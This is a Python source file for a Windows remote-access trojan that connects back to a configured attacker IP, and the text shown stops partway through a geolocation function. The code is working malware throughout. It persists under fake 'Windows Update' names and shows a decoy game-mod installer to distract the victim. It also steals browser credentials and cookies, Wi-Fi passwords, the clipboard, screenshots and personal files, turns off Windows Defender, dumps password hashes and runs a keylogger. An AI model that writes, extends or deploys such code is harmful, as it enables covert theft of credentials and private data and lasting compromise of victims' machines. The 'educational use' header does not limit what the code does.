#!/usr/bin/env python3
# victim_win.py v3.5 (ADMIN) - Advanced Windows Reverse Shell with Admin Capabilities
# Educational use / authorized pentesting only

# -------------------- IMPORTS --------------------
import socket               # TCP socket communication
import subprocess           # Execute system commands and PowerShell
import os                   # File system operations, environment variables
import sys                  # System-specific parameters (executable path, exit)
import time                 # Reconnection delay, timestamps
import base64               # Encode file chunks for safe transmission
import shutil               # High-level file operations (copy2, rmtree)
import getpass              # Retrieve current username
import winreg               # Windows registry manipulation for persistence
import zipfile              # Create ZIP archives for data exfiltration
import tempfile             # Get temporary directory for storing archives
import datetime             # Generate timestamps for file names
import ctypes               # Check admin privileges, interact with Windows API
import glob                 # Pattern matching for file cleanup and search
import urllib.request       # Download files from URLs, geolocation
import json                 # Parse JSON responses (geolocation, battery)
import hashlib              # SHA-256 for RC4 key derivation, file hashes
import threading            # Run tasks in background (port forwarding, crazy cursor, decoy)
import random               # Jitter, crazy cursor, decoy delays

# -------------------- CONFIGURATION --------------------
ATTACKER_IP = "192.168.1.203"           # Attacker's IP address (modify before deployment)
ATTACKER_PORT = 4444                    # Port on which the listener is waiting
SHARED_SECRET = b"R3vSh3ll_v3_S3cr3t_K3y!"   # Secret for RC4 key derivation (change it!)
RECONNECT_DELAY = 5                     # Base reconnection delay in seconds
BEACON_JITTER = True                    # Enable randomized reconnection delay
BEACON_MIN = 3                          # Minimum jitter delay
BEACON_MAX = 10                         # Maximum jitter delay

# Persistence configuration
PERSIST_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
PERSIST_NAME = "WindowsUpdateService"
PERSIST_SCRIPT = os.path.join(os.environ.get('APPDATA', ''), "svchost_update.pyw")
PERSIST_TASK_NAME = "WindowsUpdateCheck"

# Commonly used environment paths
TEMP = tempfile.gettempdir()
USER_PROFILE = os.environ.get('USERPROFILE', '')
APPDATA = os.environ.get('APPDATA', '')
LOCAL_APPDATA = os.environ.get('LOCALAPPDATA', '')

# ===================== CRYPTO (RC4 + Nonce) =====================

def _rc4(key: bytes, data: bytes) -> bytes:
    """RC4 stream cipher implementation."""
    S = list(range(256))
    j = 0
    # Key-scheduling algorithm (KSA)
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = bytearray()
    # Pseudo-random generation algorithm (PRGA)
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(result)

def _encrypt_data(data: bytes) -> bytes:
    """
    Encrypt data using RC4 with a random nonce.
    Returns: nonce (8 bytes) + RC4_ciphertext
    """
    nonce = os.urandom(8)
    key = hashlib.sha256(SHARED_SECRET + nonce).digest()
    return nonce + _rc4(key, data)

def _decrypt_data(data: bytes) -> bytes:
    """
    Decrypt data that was encrypted with _encrypt_data.
    Expects at least 8 bytes (the nonce).
    """
    if len(data) < 8:
        return data
    nonce = data[:8]
    key = hashlib.sha256(SHARED_SECRET + nonce).digest()
    return _rc4(key, data[8:])

def send_encrypted(sock: socket.socket, data):
    """
    Send data over the socket with encryption and length prefix.
    Protocol: [4-byte big-endian length] + [nonce + RC4 ciphertext]
    If data is a string, it is encoded to UTF-8.
    """
    if isinstance(data, str):
        data = data.encode('utf-8')
    encrypted = _encrypt_data(data)
    sock.send(len(encrypted).to_bytes(4, 'big'))
    sock.sendall(encrypted)

def recv_encrypted(sock: socket.socket) -> str | None:
    """
    Receive an encrypted message from the socket.
    Returns the decrypted plaintext string, or None if the connection was closed.
    """
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    length = int.from_bytes(raw_len, 'big')
    data = b''
    while len(data) < length:
        chunk = sock.recv(min(4096, length - len(data)))
        if not chunk:
            break
        data += chunk
    try:
        return _decrypt_data(data).decode('utf-8', errors='replace')
    except:
        return None

# ===================== HELPERS =====================

def run_cmd(cmd: str, timeout: int = 30) -> str:
    """
    Execute a system command (cmd.exe) and capture its output.
    Uses CREATE_NO_WINDOW (0x08000000) to avoid console popups.
    """
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                              timeout=timeout, creationflags=0x08000000)
        output = proc.stdout + proc.stderr
        return output.strip() if output.strip() else "[+] Executed (no output)"
    except subprocess.TimeoutExpired:
        return f"[-] Timeout ({timeout}s)"
    except Exception as e:
        return f"[-] Error: {e}"

def run_ps(cmd: str, timeout: int = 60) -> str:
    """
    Execute a PowerShell command with execution policy bypassed.
    """
    try:
        proc = subprocess.run(
            ['powershell', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', cmd],
            capture_output=True, text=True, timeout=timeout, creationflags=0x08000000)
        output = proc.stdout + proc.stderr
        return output.strip() if output.strip() else "[+] Executed (no output)"
    except subprocess.TimeoutExpired:
        return f"[-] PS timeout ({timeout}s)"
    except Exception as e:
        return f"[-] PS error: {e}"

def send_file_over_socket(sock: socket.socket, filepath: str) -> bool:
    """
    Send a file to the listener using the custom protocol:
    FILE_START, then base64 chunks (3KB each), then FILE_END.
    Returns True on success, False on failure.
    """
    try:
        send_encrypted(sock, "FILE_START")
        with open(filepath, 'rb') as f:
            while True:
                chunk = f.read(3 * 1024)
                if not chunk:
                    break
                send_encrypted(sock, base64.b64encode(chunk).decode('ascii'))
        send_encrypted(sock, "FILE_END")
        return True
    except Exception:
        try:
            send_encrypted(sock, "FILE_END")
        except:
            pass
        return False

def safe_remove(path: str):
    """Remove a file or directory without raising exceptions."""
    try:
        if os.path.isdir(path):
            shutil.rmtree(path, ignore_errors=True)
        elif os.path.isfile(path):
            os.remove(path)
    except:
        pass

def safe_copy(src: str, dst: str) -> bool:
    """Copy a file only if source exists. Returns True on success."""
    try:
        if os.path.exists(src):
            shutil.copy2(src, dst)
            return True
    except:
        pass
    return False

def is_admin() -> bool:
    """Check if the current process has administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def run_as_admin():
    """
    Attempt to relaunch the script with administrator privileges.
    Uses ShellExecuteW with the "runas" verb.
    """
    try:
        script_path = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script_path}" {params}', None, 1)
        sys.exit(0)
    except Exception:
        pass

# ===================== PERSISTENCE =====================

def install_persistence(method: str = "all") -> str:
    """
    Install persistence using the specified method(s).
    Methods: 'all', 'registry', 'task', 'startup'.
    Returns a status message.
    """
    results = []
    # First, copy the script to the persistent location if not already there
    try:
        if not os.path.exists(PERSIST_SCRIPT) or os.path.realpath(__file__) != os.path.realpath(PERSIST_SCRIPT):
            shutil.copy2(__file__, PERSIST_SCRIPT)
    except Exception as e:
        results.append(f"[-] Error copying script: {e}")

    # Use pythonw.exe to avoid console windows
    exe = sys.executable.replace("python.exe", "pythonw.exe")

    if method in ("all", "registry"):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, PERSIST_NAME, 0, winreg.REG_SZ, f'"{exe}" "{PERSIST_SCRIPT}"')
            winreg.CloseKey(key)
            results.append("[+] Persistence: Registry (HKCU Run) ✓")
        except Exception as e:
            results.append(f"[-] Registry: {e}")

    if method in ("all", "task"):
        cmd = f'schtasks /create /tn "{PERSIST_TASK_NAME}" /tr "\\"{exe}\\" \\"{PERSIST_SCRIPT}\\"" /sc onlogon /rl limited /f'
        r = run_cmd(cmd)
        if any(w in r.lower() for w in ["correctamente", "successfully", "éxito", "success"]):
            results.append("[+] Persistence: Scheduled task ✓")
        else:
            results.append(f"[-] Task: {r[:100]}")

    if method in ("all", "startup"):
        try:
            startup = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if os.path.exists(startup):
                vbs = os.path.join(startup, "WindowsUpdate.vbs")
                with open(vbs, 'w') as f:
                    f.write(f'CreateObject("WScript.Shell").Run """" & "{exe}" & """" & " " & """" & "{PERSIST_SCRIPT}" & """", 0, False')
                results.append("[+] Persistence: Startup folder ✓")
            else:
                results.append("[-] Startup: folder not found")
        except Exception as e:
            results.append(f"[-] Startup: {e}")

    return "\n".join(results) if results else "[-] Unrecognized method"

def check_persistence() -> str:
    """Report the status of all three persistence methods."""
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_READ)
        val, _ = winreg.QueryValueEx(key, PERSIST_NAME)
        winreg.CloseKey(key)
        results.append(f"[+] Registry: ACTIVE → {val}")
    except:
        results.append("[-] Registry: NO")

    o = run_cmd(f'schtasks /query /tn "{PERSIST_TASK_NAME}" 2>nul')
    results.append("[+] Task: ACTIVE" if PERSIST_TASK_NAME in o else "[-] Task: NO")

    vbs = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.vbs")
    results.append("[+] Startup: ACTIVE" if os.path.exists(vbs) else "[-] Startup: NO")
    results.append("[+] Script: exists" if os.path.exists(PERSIST_SCRIPT) else "[-] Script: NO")
    return "\n".join(results)

def remove_persistence() -> str:
    """Remove all traces of persistence."""
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, PERSIST_NAME)
        winreg.CloseKey(key)
        results.append("[+] Registry removed")
    except:
        results.append("[-] Registry: not found")
    run_cmd(f'schtasks /delete /tn "{PERSIST_TASK_NAME}" /f 2>nul')
    results.append("[+] Task removed")
    vbs = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.vbs")
    safe_remove(vbs)
    results.append("[+] Startup removed")
    safe_remove(PERSIST_SCRIPT)
    results.append("[+] Script removed")
    return "\n".join(results)

# ===================== DROPPER & AUTO-PERSISTENCE =====================

_persist_active = True

def toggle_persistence() -> str:
    """Toggle automatic re-installation of persistence on reconnect."""
    global _persist_active
    _persist_active = not _persist_active
    state = "ACTIVATED (hooked to system)" if _persist_active else "DEACTIVATED (released)"
    return f"[*] Automatic malware grip: {state}"

def launch_decoy():
    """
    Launch a fake installer GUI to distract the user.
    Runs in a separate thread so it doesn't block the main connection loop.
    """
    if os.path.realpath(__file__) == os.path.realpath(PERSIST_SCRIPT):
        return
    def _run_gui():
        try:
            import tkinter as tk
            from tkinter import ttk, messagebox
            root = tk.Tk()
            root.title("ModLoader Pro - Installer v3.2")
            root.geometry("500x220")
            root.resizable(False, False)
            root.configure(bg="#1a1a2e")
            root.attributes('-topmost', True)
            try:
                root.iconbitmap(default='')
            except:
                pass
            tk.Label(root, text="\U0001F3AE ModLoader Pro", font=("Segoe UI", 16, "bold"),
                     bg="#1a1a2e", fg="#e94560").pack(pady=(18, 2))
            tk.Label(root, text="Universal Game Mod Installer", font=("Segoe UI", 9),
                     bg="#1a1a2e", fg="#666").pack()
            status_var = tk.StringVar(value="Preparing installation...")
            tk.Label(root, textvariable=status_var, font=("Segoe UI", 9),
                     bg="#1a1a2e", fg="#a0a0a0").pack(pady=8)
            style = ttk.Style()
            style.theme_use('default')
            style.configure("M.Horizontal.TProgressbar", troughcolor='#16213e',
                            background='#e94560', thickness=22)
            progress = ttk.Progressbar(root, style="M.Horizontal.TProgressbar",
                                       length=420, mode='determinate')
            progress.pack(pady=6)
            tk.Label(root, text="v3.2.1 build 847  |  \u00a9 2024 ModLoader Team",
                     font=("Segoe UI", 7), bg="#1a1a2e", fg="#444").pack(side='bottom', pady=8)
            steps = [
                (8, "Connecting to mod server..."),
                (18, "Authenticating session..."),
                (30, "Fetching mod index (1/3)..."),
                (44, "Downloading mod files (2/3)..."),
                (58, "Downloading assets (3/3)..."),
                (70, "Extracting archive..."),
                (80, "Verifying checksums..."),
                (88, "Installing components..."),
                (95, "Finalizing...")
            ]
            def update_progress(step=0):
                if step < len(steps):
                    progress['value'] = steps[step][0]
                    status_var.set(steps[step][1])
                    root.after(random.randint(700, 1800), update_progress, step + 1)
                else:
                    progress['value'] = 100
                    status_var.set("Verifying installation...")
                    root.after(1200, show_error)
            def show_error():
                root.attributes('-topmost', False)
                messagebox.showerror("Installation Error",
                                     "Error 0x80070005: Access is denied.\n\n"
                                     "Failed to extract assets. Please check permissions or "
                                     "disable your antivirus temporarily.")
                root.destroy()
            root.update_idletasks()
            w, h = root.winfo_width(), root.winfo_height()
            root.geometry(f'{w}x{h}+{(root.winfo_screenwidth()//2)-(w//2)}+{(root.winfo_screenheight()//2)-(h//2)}')
            root.after(400, update_progress)
            root.mainloop()
        except ImportError:
            # If tkinter is not available, show a fake error via PowerShell
            run_ps('Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("The application encountered an unexpected error.\nError: 0xC0000135","Application Error","OK","Error")', timeout=2)
        except:
            pass
    threading.Thread(target=_run_gui, daemon=True).start()

# ===================== SYSINFO (returns tar path) =====================

def gather_sysinfo() -> str:
    """
    Collect extensive system information, package it into a .tar archive,
    and return the path to the archive (or error message).
    """
    import tarfile
    info_dir = os.path.join(TEMP, "si_" + datetime.datetime.now().strftime('%H%M%S'))
    os.makedirs(info_dir, exist_ok=True)

    cmds = {
        "systeminfo.txt": "systeminfo",
        "ipconfig.txt": "ipconfig /all",
        "services.txt": "sc query",
        "processes.txt": "tasklist /v",
        "users.txt": "net user",
        "admins.txt": "net localgroup administrators",
        "env.txt": "set",
        "arp.txt": "arp -a",
        "routes.txt": "route print",
        "shares.txt": "net share",
        "netstat.txt": "netstat -ano",
        "dns_cache.txt": "ipconfig /displaydns",
        "firewall.txt": "netsh advfirewall show allprofiles",
        "hotfixes.txt": "wmic qfe list full",
        "drives.txt": "wmic logicaldisk get caption,description,freespace,size",
        "startup_items.txt": "wmic startup list full",
        "whoami_all.txt": "whoami /all",
    }
    for fname, c in cmds.items():
        out = run_cmd(c, timeout=45)
        try:
            with open(os.path.join(info_dir, fname), 'w', encoding='utf-8', errors='replace') as f:
                f.write(out)
        except:
            pass

    safe_copy(r"C:\Windows\System32\drivers\etc\hosts", os.path.join(info_dir, "hosts"))

    # WiFi profiles
    wifi_dir = os.path.join(info_dir, "wifi")
    os.makedirs(wifi_dir, exist_ok=True)
    run_cmd(f'netsh wlan export profile key=clear folder="{wifi_dir}"', timeout=15)

    # Registry exports
    for fname, regpath in {
        "autorun_hkcu.reg": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "autorun_hklm.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "installed.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
    }.items():
        run_cmd(f'reg export "{regpath}" "{os.path.join(info_dir, fname)}" /y', timeout=30)

    # PowerShell extras
    for fname, pcmd in {
        "installed_software.txt": "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -EA SilentlyContinue | Select DisplayName,DisplayVersion,Publisher | Sort DisplayName | FT -Auto | Out-String -Width 200",
        "scheduled_tasks.txt": "Get-ScheduledTask | Where {$_.State -ne 'Disabled'} | Select TaskName,TaskPath,State | FT -Auto | Out-String -Width 200",
        "antivirus.txt": "Get-MpComputerStatus -EA SilentlyContinue | FL | Out-String -Width 200",
    }.items():
        out = run_ps(pcmd, timeout=60)
        try:
            with open(os.path.join(info_dir, fname), 'w', encoding='utf-8', errors='replace') as f:
                f.write(out)
        except:
            pass

    tar_path = os.path.join(TEMP, "sysinfo.tar")
    try:
        with tarfile.open(tar_path, 'w') as tar:
            tar.add(info_dir, arcname="sysinfo")
        safe_remove(info_dir)
        return tar_path
    except Exception as e:
        safe_remove(info_dir)
        return f"[-] Tar error: {e}"

# ===================== SCREENSHOT =====================

def take_screenshot() -> str:
    """Take a screenshot of the primary monitor and return the path to the PNG."""
    sc_path = os.path.join(TEMP, "sc.png")
    ps = f'''Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($b.Width,$b.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
$bmp.Save("{sc_path}")
$g.Dispose(); $bmp.Dispose()'''
    run_ps(ps, timeout=15)
    return sc_path if os.path.exists(sc_path) else "[-] Screenshot failed"

# ===================== WIFI =====================

def get_wifi_passwords() -> str:
    """Retrieve all saved WiFi passwords in plain text."""
    out = run_cmd("netsh wlan show profiles", timeout=15)
    if "no hay" in out.lower() or "is not" in out.lower() or "no se" in out.lower():
        return "[-] No WiFi profiles or WLAN unavailable"
    results = []
    for line in out.split('\n'):
        if "Perfil de todos los usuarios" in line or "All User Profile" in line:
            name = line.split(':')[1].strip() if ':' in line else None
            if name:
                detail = run_cmd(f'netsh wlan show profile name="{name}" key=clear', timeout=10)
                pwd = ""
                for dl in detail.split('\n'):
                    if "Contenido de la clave" in dl or "Key Content" in dl:
                        pwd = dl.split(':')[1].strip() if ':' in dl else "N/A"
                        break
                results.append(f"  {name}  →  {pwd if pwd else 'N/A'}")
    return "[+] WiFi:\n" + "\n".join(results) if results else "[-] No passwords"

# ===================== CLIPBOARD =====================

def get_clipboard() -> str:
    """Return the current content of the clipboard."""
    r = run_ps("Get-Clipboard -EA SilentlyContinue", timeout=10)
    return f"[+] Clipboard:\n{r}" if r and not r.startswith("[-]") else "[-] Clipboard empty"

# ===================== SOFTWARE =====================

def get_installed_software() -> str:
    """List all installed software via PowerShell."""
    ps = '''$s=@(); @('HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*') | %{ $s += Get-ItemProperty $_ -EA SilentlyContinue | Where {$_.DisplayName} | Select DisplayName,DisplayVersion,Publisher }; $s | Sort DisplayName -Unique | FT -Auto | Out-String -Width 300'''
    return run_ps(ps, timeout=60)

# ===================== BROWSERS =====================

def steal_browsers() -> str:
    """
    Steal browser data (Login Data, Cookies, History, etc.) from Chrome, Edge,
    Brave, Opera, and Firefox. Returns path to a ZIP archive or error message.
    """
    bdir = os.path.join(TEMP, "br_" + datetime.datetime.now().strftime('%H%M%S'))
    os.makedirs(bdir, exist_ok=True)
    found = False
    targets = ["Login Data", "Cookies", "History", "Bookmarks", "Web Data"]

    for bname, base in [
        ("Chrome", os.path.join(LOCAL_APPDATA, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(LOCAL_APPDATA, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(LOCAL_APPDATA, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Opera", os.path.join(APPDATA, "Opera Software", "Opera Stable")),
    ]:
        if not os.path.exists(base):
            continue
        out = os.path.join(bdir, bname)
        os.makedirs(out, exist_ok=True)
        default = os.path.join(base, "Default")
        if os.path.exists(default):
            for t in targets:
                if safe_copy(os.path.join(default, t), os.path.join(out, f"Default_{t}")):
                    found = True
        safe_copy(os.path.join(base, "Local State"), os.path.join(out, "Local_State"))

    # Firefox
    ff = os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles")
    if os.path.exists(ff):
        for prof in glob.glob(os.path.join(ff, "*.default*")):
            pout = os.path.join(bdir, "Firefox", os.path.basename(prof))
            os.makedirs(pout, exist_ok=True)
            for f in ["places.sqlite", "cookies.sqlite", "logins.json", "key4.db", "cert9.db"]:
                if safe_copy(os.path.join(prof, f), os.path.join(pout, f)):
                    found = True

    if not found:
        safe_remove(bdir)
        return "[-] No browser data found"

    zpath = os.path.join(TEMP, "browsers.zip")
    try:
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(bdir):
                for file in files:
                    fp = os.path.join(root, file)
                    try:
                        zf.write(fp, os.path.relpath(fp, bdir))
                    except:
                        pass
        safe_remove(bdir)
        return zpath
    except Exception as e:
        safe_remove(bdir)
        return f"[-] Error: {e}"

# ===================== PRIVESC CHECK =====================

def check_privesc() -> str:
    """Analyze common privilege escalation vectors."""
    r = []
    r.append("=== ADMIN: {} ===".format("YES" if is_admin() else "NO"))
    r.append("\n=== PRIVILEGES ===")
    r.append(run_cmd("whoami /priv"))
    r.append("\n=== GROUPS ===")
    r.append(run_cmd("whoami /groups"))
    r.append("\n=== UNQUOTED SERVICE PATHS ===")
    r.append(run_ps("Get-WmiObject Win32_Service -EA SilentlyContinue | Where { $_.PathName -notlike '\"*' -and $_.PathName -like '* *' -and $_.PathName -notlike 'C:\\Windows\\*' } | Select Name,PathName,StartMode | FT -Auto | Out-String -Width 300", timeout=30))
    # AlwaysInstallElevated
    r.append("\n=== AlwaysInstallElevated ===")
    o1 = run_cmd('reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul')
    o2 = run_cmd('reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul')
    r.append("[!] ENABLED" if "0x1" in o1 and "0x1" in o2 else "[-] Not enabled")
    # Writable PATH dirs
    r.append("\n=== WRITABLE DIRS IN PATH ===")
    for d in os.environ.get('PATH', '').split(';'):
        d = d.strip()
        if d and os.path.exists(d) and os.access(d, os.W_OK):
            r.append(f"  [!] {d}")
    r.append("\n=== STORED CREDENTIALS ===")
    r.append(run_cmd("cmdkey /list"))
    return "\n".join(r)

# ===================== STEAL FILES =====================

def steal_files() -> str:
    """Archive common user folders and return path to ZIP."""
    if not USER_PROFILE:
        return "[-] No USERPROFILE"
    folders = {n: os.path.join(USER_PROFILE, n) for n in ['Desktop', 'Downloads', 'Documents', 'Pictures', 'Videos']}
    existing = {n: p for n, p in folders.items() if os.path.exists(p)}
    if not existing:
        return "[-] No folders found"
    zpath = os.path.join(TEMP, f"steal_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
    MAX_FILE_SIZE = 50 * 1024 * 1024   # 50 MB per file
    MAX_TOTAL_SIZE = 500 * 1024 * 1024 # 500 MB total
    total = 0
    limit_hit = False
    try:
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for fn, fp in existing.items():
                if limit_hit:
                    break
                for root, dirs, files in os.walk(fp):
                    if limit_hit:
                        break
                    for file in files:
                        full = os.path.join(root, file)
                        try:
                            fsize = os.path.getsize(full)
                            if fsize > MAX_FILE_SIZE:
                                continue
                            if total + fsize > MAX_TOTAL_SIZE:
                                limit_hit = True
                                break
                            zf.write(full, os.path.join(fn, os.path.relpath(full, fp)))
                            total += fsize
                        except:
                            continue
        return zpath
    except Exception as e:
        return f"[-] ZIP error: {e}"

# ===================== EXFIL COMPLETO =====================

def full_exfil() -> str:
    """Perform a total exfiltration: sysinfo + wifi + screenshot + clipboard + browsers + software + registry."""
    import tarfile
    edir = os.path.join(TEMP, "ex_" + datetime.datetime.now().strftime('%H%M%S'))
    os.makedirs(edir, exist_ok=True)

    # Sysinfo
    si = os.path.join(edir, "sysinfo")
    os.makedirs(si, exist_ok=True)
    for fname, c in {"systeminfo.txt": "systeminfo", "ipconfig.txt": "ipconfig /all", "processes.txt": "tasklist /v",
                      "users.txt": "net user", "netstat.txt": "netstat -ano", "whoami.txt": "whoami /all"}.items():
        try:
            with open(os.path.join(si, fname), 'w', encoding='utf-8', errors='replace') as f:
                f.write(run_cmd(c, timeout=45))
        except:
            pass
    safe_copy(r"C:\Windows\System32\drivers\etc\hosts", os.path.join(si, "hosts"))

    # WiFi
    with open(os.path.join(edir, "wifi.txt"), 'w', encoding='utf-8') as f:
        f.write(get_wifi_passwords())
    wdir = os.path.join(edir, "wifi_profiles")
    os.makedirs(wdir, exist_ok=True)
    run_cmd(f'netsh wlan export profile key=clear folder="{wdir}"', timeout=15)

    # Screenshot
    sc = take_screenshot()
    if os.path.exists(str(sc)):
        safe_copy(sc, os.path.join(edir, "screenshot.png"))
        safe_remove(sc)

    # Clipboard
    with open(os.path.join(edir, "clipboard.txt"), 'w', encoding='utf-8') as f:
        f.write(get_clipboard())

    # Browsers
    br = steal_browsers()
    if os.path.exists(str(br)):
        safe_copy(br, os.path.join(edir, "browsers.zip"))
        safe_remove(br)

    # Software
    with open(os.path.join(edir, "software.txt"), 'w', encoding='utf-8') as f:
        f.write(get_installed_software())

    # Registry
    rdir = os.path.join(edir, "registry")
    os.makedirs(rdir, exist_ok=True)
    for fname, rp in {"autorun_hkcu.reg": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                       "autorun_hklm.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                       "installed.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"}.items():
        run_cmd(f'reg export "{rp}" "{os.path.join(rdir, fname)}" /y', timeout=30)

    # Credentials
    with open(os.path.join(edir, "credentials.txt"), 'w', encoding='utf-8') as f:
        f.write(run_cmd("cmdkey /list"))

    tar_path = os.path.join(TEMP, "exfil.tar")
    try:
        with tarfile.open(tar_path, 'w') as tar:
            tar.add(edir, arcname="exfil")
        safe_remove(edir)
        return tar_path
    except Exception as e:
        safe_remove(edir)
        return f"[-] Tar error: {e}"

# ===================== DEFENDER =====================

def disable_defender() -> str:
    """Attempt to disable Windows Defender (requires admin)."""
    if not is_admin():
        return "[-] Requires admin"
    r = []
    for name, c in [
        ('RealTime', 'Set-MpPreference -DisableRealtimeMonitoring $true'),
        ('Behavior', 'Set-MpPreference -DisableBehaviorMonitoring $true'),
        ('Script', 'Set-MpPreference -DisableScriptScanning $true'),
        ('IOAV', 'Set-MpPreference -DisableIOAVProtection $true'),
        ('Excl TEMP', f'Add-MpPreference -ExclusionPath "{TEMP}"'),
        ('Excl APPDATA', f'Add-MpPreference -ExclusionPath "{APPDATA}"'),
    ]:
        o = run_ps(c, timeout=15)
        r.append(f"{'[+]' if 'error' not in o.lower() and 'denied' not in o.lower() else '[-]'} {name}")
    return "\n".join(r)

# ===================== DUMP HASHES =====================

def dump_hashes() -> str:
    """Save SAM, SYSTEM, SECURITY hives for offline hash extraction (requires admin)."""
    if not is_admin():
        return "[-] Requires admin"
    r = []
    paths = []
    for name, hive in [("SAM", "SAM"), ("SYSTEM", "SYSTEM"), ("SECURITY", "SECURITY")]:
        p = os.path.join(TEMP, f"{name.lower()}.save")
        run_cmd(f'reg save HKLM\\{hive} "{p}" /y')
        if os.path.exists(p):
            r.append(f"[+] {name} → {p}")
            paths.append(p)
        else:
            r.append(f"[-] {name}: failed")
    if paths:
        r.append("\n[*] Download with: download <path>")
    return "\n".join(r)

# ===================== KEYLOGGER =====================

_keylog_active = False
_keylog_file = os.path.join(TEMP, "kl.txt")

def keylog_control(action: str) -> str:
    """Control the PowerShell keylogger: start, stop, dump, clear."""
    global _keylog_active
    if action == "start":
        if _keylog_active:
            return "[*] Already active"
        ps_script = r'''Add-Type -AssemblyName System.Windows.Forms
$sig=@"
[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")]public static extern int GetWindowText(IntPtr h,System.Text.StringBuilder s,int n);
[DllImport("user32.dll")]public static extern IntPtr GetForegroundWindow();
"@
$A=Add-Type -MemberDefinition $sig -Name W -Namespace K -PassThru
$f="''' + _keylog_file + r'''"
$lw=""
while($true){Start-Sleep -M 40
$sb=New-Object System.Text.StringBuilder 256
[K.W]::GetWindowText([K.W]::GetForegroundWindow(),$sb,256)|Out-Null
$cw=$sb.ToString()
if($cw -ne $lw){$lw=$cw;"`r`n--- [$cw] $(Get-Date -F 'HH:mm:ss') ---`r`n"|Out-File $f -Append}
for($i=8;$i -le 190;$i++){if([K.W]::GetAsyncKeyState($i) -eq -32767){$k=[System.Windows.Forms.Keys]$i
switch($k){'Space'{' '|Out-File $f -A -NoNewline}'Return'{"`r`n"|Out-File $f -A -NoNewline}'Back'{'[BS]'|Out-File $f -A -NoNewline}default{"$k"|Out-File $f -A -NoNewline}}}}}'''
        ps_path = os.path.join(TEMP, "kl.ps1")
        try:
            with open(ps_path, 'w') as f:
                f.write(ps_script)
            subprocess.Popen(['powershell', '-NoProfile', '-EP', 'Bypass', '-WindowStyle', 'Hidden', '-File', ps_path],
                             creationflags=0x08000000)
            _keylog_active = True
            return "[+] Keylogger started"
        except Exception as e:
            return f"[-] Error: {e}"
    elif action == "stop":
        run_ps('''Get-WmiObject Win32_Process -Filter "Name='powershell.exe'" | Where-Object {$_.CommandLine -like '*kl.ps1*'} | ForEach-Object {Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue}''')
        _keylog_active = False
        safe_remove(os.path.join(TEMP, "kl.ps1"))
        return "[+] Keylogger stopped"
    elif action == "dump":
        if os.path.exists(_keylog_file):
            try:
                with open(_keylog_file, 'r', encoding='utf-8', errors='replace') as f:
                    return f"[+] Keylog:\n{f.read()}"
            except Exception as e:
                return f"[-] Error: {e}"
        return "[-] No data"
    elif action == "clear":
        safe_remove(_keylog_file)
        return "[+] Keylog cleared"
    return "[-] Usage: keylog start|stop|dump|clear"

# ===================== GEOLOCATE =====================

def geolocate() -> str:
    """Get approximate geolocation using ipinfo.io."""
    try:
        req = urllib.request.Request("https://ipinfo.io/json")
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode('utf-8'))
